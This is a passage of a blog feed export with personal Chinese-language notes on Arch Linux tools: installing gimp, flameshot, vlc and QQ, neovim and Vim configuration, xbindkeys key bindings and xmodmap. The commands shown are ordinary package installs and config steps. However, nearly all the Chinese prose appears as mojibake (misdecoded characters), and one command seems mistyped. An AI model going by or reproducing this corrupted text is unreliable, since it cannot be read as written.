class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">ag -G manager <span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure><p>æ–‡ä»¶åä¸­åŒ…å« <code>manager</code>, æ–‡ä»¶ä¸­åŒ…å« <code>class</code>.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Arch-ä¸­é¢å¤–è½¯ä»¶ç›¸å…³</title>
    <link href="/2022/09/19/Arch-%E4%B8%AD%E9%A2%9D%E5%A4%96%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%9B%B8%E5%85%B3/"/>
    <url>/2022/09/19/Arch-%E4%B8%AD%E9%A2%9D%E5%A4%96%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%9B%B8%E5%85%B3/</url>
    
    <content type="html"><![CDATA[<h1 id="å›¾ç‰‡ç›¸å…³"><a href="#å›¾ç‰‡ç›¸å…³" class="headerlink" title="å›¾ç‰‡ç›¸å…³"></a>å›¾ç‰‡ç›¸å…³</h1><h2 id="å›¾ç‰‡å¤„ç†è½¯ä»¶"><a href="#å›¾ç‰‡å¤„ç†è½¯ä»¶" class="headerlink" title="å›¾ç‰‡å¤„ç†è½¯ä»¶"></a>å›¾ç‰‡å¤„ç†è½¯ä»¶</h2><p>ç”¨ gimp, å¯åœ¨ ArchWiki ä¸ŠæŸ¥çœ‹.</p><p>ç›´æ¥ç”¨ pacman ä¸‹è½½:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S gimp</span><br></code></pre></td></tr></table></figure><p>gimp å¯ä»¥è‡ªå®šä¹‰å¿«æ·é”®. é…ç½®æ–‡ä»¶åœ¨ <code>~/.config/GIMP</code> ç›®å½•é‡Œé¢.</p><p>gimp æœ‰ä¸€ä¸ªæ’ä»¶ç³»ç»Ÿ.</p><p>gimp éœ€è¦ poppler-glib æ¥é¢„è§ˆ PDF æ–‡ä»¶.</p><h2 id="æˆªå›¾è½¯ä»¶"><a href="#æˆªå›¾è½¯ä»¶" class="headerlink" title="æˆªå›¾è½¯ä»¶"></a>æˆªå›¾è½¯ä»¶</h2><p>ç”¨ flameshot.</p><p>ä¸‹è½½:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S flameshot</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥åœ¨è¿›å…¥ X åæ‰“å¼€ flameshot:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">flameshot <span class="hljs-meta">&amp;</span><br></code></pre></td></tr></table></figure><h1 id="éŸ³ä¹ç›¸å…³"><a href="#éŸ³ä¹ç›¸å…³" class="headerlink" title="éŸ³ä¹ç›¸å…³"></a>éŸ³ä¹ç›¸å…³</h1><h2 id="qqéŸ³ä¹"><a href="#qqéŸ³ä¹" class="headerlink" title="qqéŸ³ä¹"></a>qqéŸ³ä¹</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">yay -S qqmusic-bin</span><br></code></pre></td></tr></table></figure><h1 id="è§†é¢‘æ’­æ”¾"><a href="#è§†é¢‘æ’­æ”¾" class="headerlink" title="è§†é¢‘æ’­æ”¾"></a>è§†é¢‘æ’­æ”¾</h1><h2 id="vlc-æ’­æ”¾å™¨"><a href="#vlc-æ’­æ”¾å™¨" class="headerlink" title="vlc æ’­æ”¾å™¨"></a>vlc æ’­æ”¾å™¨</h2><p>ä¸‹è½½.</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S vlc</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥æ›´æ¢è¯­è¨€, å…·ä½“çœ‹ ArchWiki.</p><p>å¯ä»¥æ¢çš®è‚¤, <a href="https://www.videolan.org/vlc/skins.php">çš®è‚¤ç½‘ç«™</a>. ç„¶åå°†å…¶æ”¾å…¥ <code>~/.local/share/vlc/skin2/</code> ç›®å½•ä¸‹.</p><p>å¯ä»¥åœ¨ç½‘ç«™ä¸­æ‰“å¼€. å…·ä½“çœ‹ ArchWiki.</p><p>å¯ä»¥ä½¿ç”¨ hotkeys.</p><h1 id="ç¤¾äº¤"><a href="#ç¤¾äº¤" class="headerlink" title="ç¤¾äº¤"></a>ç¤¾äº¤</h1><h2 id="deepin-qq"><a href="#deepin-qq" class="headerlink" title="deepin-qq"></a>deepin-qq</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">yay -S deepin-wine-qq</span><br></code></pre></td></tr></table></figure><p>æ‰“å¼€ qq çš„è„šæœ¬ä½äº <code>/opt/apps/com.qq.im.deepin/files/run.sh</code></p><p>å¯ä»¥åœ¨ <code>.bashrc</code> æ–‡ä»¶ä¸­ç”¨ <code>alias</code> å¤„ç†ä¸€ä¸‹.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>sh-å’Œ-bash-çš„åŒºåˆ«</title>
    <link href="/2022/09/19/sh-%E5%92%8C-bash-%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
    <url>/2022/09/19/sh-%E5%92%8C-bash-%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    
    <content type="html"><![CDATA[<p>sh æ˜¯ Bourne Shell, bash æ˜¯ Bourne-Again Shell.</p><p>åœ¨ Linux ä¸Š, <code>/bin/sh</code> å¾€å¾€æ˜¯ <code>/bin/bash</code> çš„ç¬¦å·é“¾æ¥.</p><p>sh å¯ä»¥ç®—æ˜¯å¼€å¯äº† POSIX æ ‡å‡†çš„ bash, å³ sh åœ¨æŸè¡Œä»£ç å‡ºé”™æ—¶, ä¸ç»§ç»­å¾€ä¸‹è§£é‡Š. </p>]]></content>
    
    
    <categories>
      
      <category>Shell</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Modern-Vim-Notes</title>
    <link href="/2022/09/18/Modern-Vim-Notes/"/>
    <url>/2022/09/18/Modern-Vim-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>åœ¨ <code>:help key-notation</code> ä¸­å¯ä»¥æŸ¥çœ‹é”®å.</p><p>é»˜è®¤çš„ <leader> key æ˜¯ <code>\</code>.</p><p>Neovim å¯ä»¥ç”¨ <code>:terminal</code> è¿›å…¥ TERMINAL æ¨¡å¼. å…¶ä¼šæ‰“å¼€ä¸€ä¸ª terminal buffer.</p><p><code>set nocompatible</code> æ„æ€å°±æ˜¯ä¸å…¼å®¹ä»¥å‰çš„ç‰ˆæœ¬.</p><p>æ£€æŸ¥ filetype detection å·²ç»æ‰“å¼€:</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm">:file<span class="hljs-keyword">type</span><br></code></pre></td></tr></table></figure><h1 id="CHAPTER-1-Get-Modern-Vim"><a href="#CHAPTER-1-Get-Modern-Vim" class="headerlink" title="CHAPTER 1 Get Modern Vim"></a>CHAPTER 1 Get Modern Vim</h1><p>å°† <code>$VISUAL</code> è¿™ä¸ªå˜é‡è®¾ä¸º nvim, å¯ä»¥è®©æ‰€æœ‰é»˜è®¤ç”¨ vim çš„ç¨‹åºæ”¹ç”¨ nvim.</p><p>æŸ¥çœ‹ <code>:help base-directories</code> å¯ä»¥æŸ¥çœ‹ä¸€äº›é»˜è®¤ç›®å½•çš„ä½ç½®.</p><p>å¯¹äº neovim æœ‰ä¸¤ä¸ªæ¯”è¾ƒé‡è¦çš„å˜é‡:</p><ul><li>VIMCONFIG, ä¸€èˆ¬è®¾ä¸º <code>~/.config/nvim</code></li><li>VIMDATA, ä¸€èˆ¬è®¾ä¸º <code>~/.local/share/nvim</code></li></ul><p>åœ¨ Neovim ä¸­, å¯ä»¥åŒæ—¶æä¾›  Python2 å’Œ Python3.</p><p>å¦‚ä½¿ç”¨ Python3:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl">:<span class="hljs-variable">py3</span> <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">&#x27;hello&#x27;</span>)</span><br></code></pre></td></tr></table></figure><p>Neovim ç”¨ providers æ¥ implement ä¸€äº› features.</p><p>å¯ä»¥ç”¨ <code>+</code> å’Œ <code>*</code> è¿™ä¸¤ä¸ªå¯„å­˜å™¨æ¥å’Œç³»ç»Ÿçš„ clipboard äº’åŠ¨.</p><p>å®‰è£… neovim-remote, è¿™ä¸ªå·¥å…·å¯ä»¥è®©ä½ è¿œç¨‹æ“æ§ neovim è¿›ç¨‹, å…¶éœ€è¦ Python3 æ”¯æŒ:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">$ pip3 install --<span class="hljs-keyword">user</span> <span class="hljs-title">--upgrade</span> neovim-remote<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå·¥å…·åœ¨å‘½ä»¤è¡Œä¸‹ä½¿ç”¨æ˜¯ <code>nvr</code>:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>nvr -h<br></code></pre></td></tr></table></figure><h1 id="CHAPTER-2-Installing-Plugins"><a href="#CHAPTER-2-Installing-Plugins" class="headerlink" title="CHAPTER 2 Installing Plugins"></a>CHAPTER 2 Installing Plugins</h1><p><code>command! Hello call SayHello()</code></p><p>è¿™é‡Œ, <code>command!</code> è¿™ä¸ªå‘½ä»¤çš„ä½œç”¨æ˜¯åˆ›å»ºä¸€ä¸ªå‘½ä»¤. å•çº¯çš„è¿è¡Œ <code>:command</code> è¿™ä¸ªæŒ‡ä»¤ä¼šåˆ—å‡ºæ‰€æœ‰çš„ç”¨æˆ·å®šä¹‰çš„å‘½ä»¤. å¯ä»¥å’Œ <code>:filter</code> è¿™ä¸ªå‘½ä»¤é…åˆ, å¦‚ <code>:filter Coc command</code> å°±ä¼šæ˜¾ç¤ºæ‰€æœ‰å¸¦ <code>Coc</code> çš„å‘½ä»¤. åŠ ä¸€ä¸ª <code>!</code> çš„ä½œç”¨æ˜¯å¯ä»¥ <mark>é‡å®šä¹‰</mark> å³è¦†ç›–æ‰ä¹‹å‰çš„å®šä¹‰.</p><p>å¯ä»¥ç”¨  <code>:source</code> æ¥åŠ è½½ script:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">:<span class="hljs-built_in">source</span> code/hello.vim<br></code></pre></td></tr></table></figure><p>æ¯ä¸‹è½½ä¸€ä¸ª plugin, å°±éœ€è¦å°†å…¶æ·»åŠ åˆ° Vimâ€™s <code>runtimepath</code> ä¸­.<br>å¦‚:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">:set runtimepath+=<span class="hljs-variable">$VIMCONFIG</span><span class="hljs-regexp">/arbitrary/</span>demo-plugin<br></code></pre></td></tr></table></figure><p>åœ¨ <code>:h</code> çš„æ–‡æ¡£ä¸­è·³è½¬, æŒ‰ä¸‹ <code>&lt;C-]&gt;</code> è·³è½¬åˆ°æŒ‡å®šçš„ anchor, æŒ‰ä¸‹ <code>&lt;C-o&gt;</code> è·³å›.</p><p>ä½¿ç”¨ <code>:helptags ALL</code> å°†åˆ›å»ºæ‰€æœ‰æ’ä»¶çš„ documentation, åˆ°ä½ çš„ <code>:help</code> ç•Œé¢.</p><h1 id="CHAPTER-3-Opening-Files"><a href="#CHAPTER-3-Opening-Files" class="headerlink" title="CHAPTER 3 Opening Files"></a>CHAPTER 3 Opening Files</h1><p><code>:edit</code> å‘½ä»¤å¯ä»¥ç®€å†™ä¸º <code>:e</code>.</p><p><code>:vsplite</code> å‘½ä»¤å¯ä»¥ç®€å†™ä¸º <code>:vs</code>. </p><p>å…³äº fzf å·¥å…·, åœ¨æ‰¾åˆ°åŒ¹é…é¡¹å, æŒ‰ <code>&lt;C-v&gt;</code> å¯ä»¥åœ¨å¦ä¸€æµ‹æ‰“å¼€æ–‡ä»¶. <code>&lt;C-x&gt;</code> æ˜¯ horizontal, <code>&lt;C-t&gt;</code> æ˜¯æ–°çš„ tab ä¸­æ‰“å¼€.</p><p>fzf é»˜è®¤æ˜¯ç”¨ <code>find . -type f</code> æ¥æŸ¥æ‰¾æ–‡ä»¶, å¯ä»¥åˆ©ç”¨ <code>FZF_DEFAULT_COMMAND</code> è¿™ä¸ªç¯å¢ƒå˜é‡æ¥æ›´æ”¹.</p><p>ä½¿ç”¨ <code>:buffer &#123;bufname&#125;</code> å¯ä»¥åœ¨ buffer ä¹‹é—´è·³è½¬.</p><h1 id="CHAPTER-4-Working-with-the-Quickfix-List"><a href="#CHAPTER-4-Working-with-the-Quickfix-List" class="headerlink" title="CHAPTER 4 Working with the Quickfix List"></a>CHAPTER 4 Working with the Quickfix List</h1>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-neovim</title>
    <link href="/2022/09/18/%E5%85%B3%E4%BA%8E-neovim/"/>
    <url>/2022/09/18/%E5%85%B3%E4%BA%8E-neovim/</url>
    
    <content type="html"><![CDATA[<h1 id="ä¸é…ç½®ç›¸å…³"><a href="#ä¸é…ç½®ç›¸å…³" class="headerlink" title="ä¸é…ç½®ç›¸å…³"></a>ä¸é…ç½®ç›¸å…³</h1><p>å‚è€ƒ <code>:help config</code> å’Œ <code>:help nvim-from-vim</code>.</p><h2 id="ä»-vim-è½¬æ¢åˆ°-nvim"><a href="#ä»-vim-è½¬æ¢åˆ°-nvim" class="headerlink" title="ä» vim è½¬æ¢åˆ° nvim"></a>ä» vim è½¬æ¢åˆ° nvim</h2><p>nvim å’Œ vim çš„åŒºåˆ«å¯ä»¥æŸ¥çœ‹ <code>:help vim-differences</code>.</p><p>neovim çš„é…ç½®æ–‡ä»¶æ˜¯ <code>init.vim</code>, å…¶ä½ç½®å–å†³äº: <code>$XDG_CONFIG_HOME/nvim/init.vim</code></p><p>åŸæ¥çš„ <code>.vim</code> ç°åœ¨ä½äº <code>$XDG_CONFIG_HOME/nvim</code></p><h2 id="ä¸ºä»€ä¹ˆåœ¨-Plugins-ä¸­ç”¨-Python"><a href="#ä¸ºä»€ä¹ˆåœ¨-Plugins-ä¸­ç”¨-Python" class="headerlink" title="ä¸ºä»€ä¹ˆåœ¨ Plugins ä¸­ç”¨ Python"></a>ä¸ºä»€ä¹ˆåœ¨ Plugins ä¸­ç”¨ Python</h2><p>Python èƒ½å¤Ÿæä¾› network sockets, è€Œä¸”èƒ½å¤Ÿåœ¨åå°é•¿æ—¶é—´è¿è¡Œ.</p><p>ä¸‹åœ¨ neovim çš„ python åŒ…:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">pip3 install --<span class="hljs-keyword">user</span> <span class="hljs-title">neovim</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ª <code>--user</code> flag ä¼šå°† <code>neovim</code> å®‰è£…åˆ°ä½ çš„å®¶ç›®å½•. ç¼ºç‚¹æ˜¯æ¯ä¸ªç”¨æˆ·éƒ½éœ€è¦è¿è¡Œè¿™è¡Œå‘½ä»¤.</p><p>ç¡®è®¤ location :</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">pytho<span class="hljs-symbol">n3</span> -m site<br></code></pre></td></tr></table></figure><h1 id="åœ¨æ‰“å¼€-vim-æ—¶è‡ªåŠ¨é…ç½®"><a href="#åœ¨æ‰“å¼€-vim-æ—¶è‡ªåŠ¨é…ç½®" class="headerlink" title="åœ¨æ‰“å¼€ vim æ—¶è‡ªåŠ¨é…ç½®"></a>åœ¨æ‰“å¼€ vim æ—¶è‡ªåŠ¨é…ç½®</h1>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Xbindkeys-å®‰è£…å’Œä½¿ç”¨</title>
    <link href="/2022/09/18/Xbindkeys-%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/09/18/Xbindkeys-%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="æŸä¸ª-Tutorial"><a href="#æŸä¸ª-Tutorial" class="headerlink" title="æŸä¸ª Tutorial"></a><a href="http://xahlee.info/linux/linux_xbindkeys_tutorial.html">æŸä¸ª Tutorial</a></h1><p>å¯ä»¥ç”¨ xbindkeys æ¥ run shell commands.</p><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>åœ¨ Arch Linux ä¸Š:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo pacman -S xbindkeys<br></code></pre></td></tr></table></figure><h2 id="åˆ›å»ºé…ç½®æ–‡ä»¶"><a href="#åˆ›å»ºé…ç½®æ–‡ä»¶" class="headerlink" title="åˆ›å»ºé…ç½®æ–‡ä»¶"></a>åˆ›å»ºé…ç½®æ–‡ä»¶</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">touch</span> ~/.xbindkeysrc<br></code></pre></td></tr></table></figure><p>ç¤ºä¾‹å†…å®¹:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment"># sample xbindkeys config</span><br><span class="hljs-comment"># place this file at ~/.xbindkeysrc</span><br><br><span class="hljs-comment"># make F8 launch Google Chrome browser</span><br><span class="hljs-string">&quot;google-chrome&quot;</span><br>F8<br><br><span class="hljs-comment"># make F3 do Ctrl+c</span><br><span class="hljs-string">&quot;xvkbd -no-jump-pointer -xsendevent -text &#x27;\Cc&#x27;&quot;</span><br>F3<br></code></pre></td></tr></table></figure><p>æ¯ä¸€ä¸ª xbindkeys config å ä¸¤è¡Œ. ç¬¬ä¸€è¡Œæ˜¯ shell command, ç¬¬äºŒè¡Œæ˜¯ key.</p><h2 id="é‡æ–°åŠ è½½é…ç½®æ–‡ä»¶"><a href="#é‡æ–°åŠ è½½é…ç½®æ–‡ä»¶" class="headerlink" title="é‡æ–°åŠ è½½é…ç½®æ–‡ä»¶"></a>é‡æ–°åŠ è½½é…ç½®æ–‡ä»¶</h2><p>Reload the config file:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ killall -sl xbindkeys<br></code></pre></td></tr></table></figure><p>Start xbindkeys:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ xbindkeys -f ~/.xbindkeysrc<br></code></pre></td></tr></table></figure><p>å¯ä»¥ç”¨ <code>xdg-open</code> å‘½ä»¤æ¥æ‰“å¼€æ–‡ä»¶.</p><h1 id="ArchWiki-ç›¸å…³é¡µé¢"><a href="#ArchWiki-ç›¸å…³é¡µé¢" class="headerlink" title="ArchWiki ç›¸å…³é¡µé¢"></a>ArchWiki ç›¸å…³é¡µé¢</h1><p><a href="https://wiki.archlinux.org/title/Xbindkeys">ArchWiki</a></p><h2 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h2><p>ç”Ÿæˆé…ç½®æ–‡ä»¶:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ xbindkeys -d &gt; ~/.xbindkeysrc<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>#</code> å†™æ³¨é‡Š.</p><h3 id="æ§åˆ¶éŸ³é‡"><a href="#æ§åˆ¶éŸ³é‡" class="headerlink" title="æ§åˆ¶éŸ³é‡"></a>æ§åˆ¶éŸ³é‡</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs perl">~/.xbindkeysrc<br><br><span class="hljs-comment"># Increase volume</span><br><span class="hljs-string">&quot;pactl set-sink-volume @DEFAULT_SINK@ +1000&quot;</span><br>   XF86AudioRaiseVolume<br><br><span class="hljs-comment"># Decrease volume</span><br><span class="hljs-string">&quot;pactl set-sink-volume @DEFAULT_SINK@ -1000&quot;</span><br>   XF86AudioLowerVolume<br><br><span class="hljs-comment"># Mute volume</span><br><span class="hljs-string">&quot;pactl set-sink-mute @DEFAULT_SINK@ toggle&quot;</span><br>   XF86AudioMute<br><br><span class="hljs-comment"># Mute microphone</span><br><span class="hljs-string">&quot;pactl set-source-mute @DEFAULT_SOURCE@ toggle&quot;</span><br>   XF86AudioMicMute<br></code></pre></td></tr></table></figure><h3 id="æ§åˆ¶äº®åº¦"><a href="#æ§åˆ¶äº®åº¦" class="headerlink" title="æ§åˆ¶äº®åº¦"></a>æ§åˆ¶äº®åº¦</h3><p>ç»‘å®šåˆ° <code>XF86MonBrightnessUp</code> å’Œ <code>XF86MonBrightnessDown</code>.</p><h3 id="å›¾å½¢ç•Œé¢"><a href="#å›¾å½¢ç•Œé¢" class="headerlink" title="å›¾å½¢ç•Œé¢"></a>å›¾å½¢ç•Œé¢</h3><p>å®‰è£… <code>xbindkeys_config-gtk2</code> åŒ….</p><h2 id="æ‰¾æŸä¸ªé”®çš„-keycode"><a href="#æ‰¾æŸä¸ªé”®çš„-keycode" class="headerlink" title="æ‰¾æŸä¸ªé”®çš„ keycode"></a>æ‰¾æŸä¸ªé”®çš„ keycode</h2><p>å•ä¸ª key:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ xbindkeys --key<br></code></pre></td></tr></table></figure><p>ä¹‹åä¼šå‡ºç°ä¸€ä¸ªç•Œé¢æ¥æ£€æµ‹ä½ æŒ‰ä¸‹çš„é”®.</p><p>ä¹‹åè¾“å‡ºå¦‚æœä¸º (å¦‚æœä½ æŒ‰ä¸‹çš„æ˜¯ <code>Alt+o</code>):</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-string">&quot;(Scheme function)&quot;</span><br><span class="hljs-symbol">m:</span><span class="hljs-number">0x8</span> + c:<span class="hljs-number">32</span><br>Alt + o<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€è¡Œè¡¨ç¤ºçš„æ˜¯è¿™ä¸ªé”®å¯¹åº”çš„ command.</p><p>ç¬¬äºŒè¡Œæ˜¾ç¤ºçš„æ˜¯ state (0x8) å’Œ keycode (32), å’Œ <code>xev</code> æ˜¾ç¤ºçš„å†…å®¹ä¸€æ ·.</p><p>ç¬¬ä¸‰è¡Œæ˜¾ç¤ºçš„æ˜¯ keysyms è¿™é‡ŒæŒ‡çœŸæ­£çš„å«ä¹‰è€Œä¸æ˜¯é”®ç›˜ä¸Šçš„ä½ç½®.</p><p>æœ€åä¸¤è¡Œéƒ½å¯ä»¥ç”¨æ¥æ·»åŠ åˆ°é…ç½®æ–‡ä»¶ä¸­è¡¨ç¤ºé”®ä½.</p><p>multiple keys:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ xbindkeys --multikey<br></code></pre></td></tr></table></figure><p>è·å–é¼ æ ‡çš„å‚æ•°å°±ç”¨ <code>xev</code>.</p><h2 id="ä½¿å…¶æ°¸ä¹…ç”Ÿæ•ˆ"><a href="#ä½¿å…¶æ°¸ä¹…ç”Ÿæ•ˆ" class="headerlink" title="ä½¿å…¶æ°¸ä¹…ç”Ÿæ•ˆ"></a>ä½¿å…¶æ°¸ä¹…ç”Ÿæ•ˆ</h2><p>å°† <code>xbindkeys</code> æ·»åŠ åˆ° <code>~/.xinitrc</code> ä¸­.</p><h2 id="å¤šä¸ªé”®"><a href="#å¤šä¸ªé”®" class="headerlink" title="å¤šä¸ªé”®"></a>å¤šä¸ªé”®</h2><p>é¼ æ ‡ä¸Šçš„é”®ç§°ä¸º â€œchordingâ€ key. ä¹Ÿå¯ä»¥ç”¨ xbindkeys æ¥è®¾ç½®.</p><p>å…·ä½“çœ‹ wiki.</p><h1 id="xbindkeys-ä¼¼ä¹å’Œ-dwm-ç›¸å†²çªäº†"><a href="#xbindkeys-ä¼¼ä¹å’Œ-dwm-ç›¸å†²çªäº†" class="headerlink" title="xbindkeys ä¼¼ä¹å’Œ dwm ç›¸å†²çªäº†"></a>xbindkeys ä¼¼ä¹å’Œ dwm ç›¸å†²çªäº†</h1><p>åªæœ‰åœ¨ <code>xbindkeys -n</code> çš„æ¨¡å¼ä¸‹æ‰å…¶ä½œç”¨.</p><p>å¦‚æœç”¨ <code>xbindkeys</code> å‘½ä»¤ä½¿å…¶è¿›å…¥ daemon è¿è¡Œæ¨¡å¼, å†è¿è¡Œ <code>xbindkeys -n</code>, å°±ä¼šæœ‰å¦‚ä¸‹æŠ¥é”™:<br><img src="/../img/wrong_xbindkeys.png"></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>xmodmap-å®‰è£…ä¸ä½¿ç”¨</title>
    <link href="/2022/09/18/xmodmap-%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/09/18/xmodmap-%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Xmodmap_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">å®˜æ–¹æ–‡æ¡£</a><br>xmodmap æ˜¯ç”¨äºä¿®æ”¹ Xorg ä¸­é”®ä½å›¾å’ŒæŒ‡é’ˆæ˜ å°„çš„å·¥å…·.</p><p>xmodmap å’Œ XKB (X keyboard extension) æ²¡æœ‰ç›´æ¥å…³ç³».</p><p>æ³¨æ„, xmodmap è®¾ç½®ä¼šè¢« setxkbmap é‡ç½®.</p><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>Xorg ä¸­æœ‰ä¸¤ç§ç±»å‹çš„é”®ç›˜å€¼: é”®ç å’Œé”®ç¬¦.</p><ul><li>é”®ç  keycode, è¡¨ç¤ºæŒ‰é”®æˆ–é¼ æ ‡æŒ‰é’®è¢«æŒ‰ä¸‹æ—¶, å†…æ ¸æ”¶åˆ°çš„è¡¨ç¤ºæ•°å­—</li><li>é”®ç¬¦ keysym, æ˜¯é”®ç æ‰€å¯¹åº”çš„ç¬¦å·è¡¨è¾¾å¼, æ„æ€æ˜¯å¯ä»¥é€šè¿‡æŒ‰ä¸‹ç›¸åº”çš„é”®ç¬¦å¯¹åº”çš„ä½ç½®å‘å†…æ ¸å‘é€ keycode. å¦‚ <code>Shift_L</code> æ˜¯é”®ç¬¦, è¡¨ç¤ºçš„æ˜¯é”®ç›˜ä¸Šçš„å…·ä½“ä½ç½®, 50 å’Œ (0x32) æ˜¯åŒä¸€ä¸ªæ„æ€è¡¨ç¤ºé”®ç </li></ul><p>keycode å’Œ keysym çš„æ˜ å°„è¡¨å¯ä»¥ç”¨ <code>xmodmap</code> æŸ¥çœ‹.</p><p>å†…æ ¸å¯¹ keycode çš„è§£é‡Šæ˜¯å®šæ­»äº†çš„, ä½†æ˜¯æŒ‰ä¸‹ä»€ä¹ˆé”®å‘é€ä»€ä¹ˆ keycode æ˜¯æˆ‘ä»¬å¯ä»¥æ“æ§çš„.</p><h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><p><code>xorg-xmodmap</code> åŒ…æä¾› xmodmap.</p><p><code>xkeycaps</code> åŒ…æä¾› xmodmap çš„å›¾å½¢å‰ç«¯.</p><h1 id="é”®æ˜ å°„è¡¨"><a href="#é”®æ˜ å°„è¡¨" class="headerlink" title="é”®æ˜ å°„è¡¨"></a>é”®æ˜ å°„è¡¨</h1><p>ä»¥è¡¨è¾¾å¼æ ¼å¼å‘ˆç°:</p><figure class="highlight sh"><table><tr><td 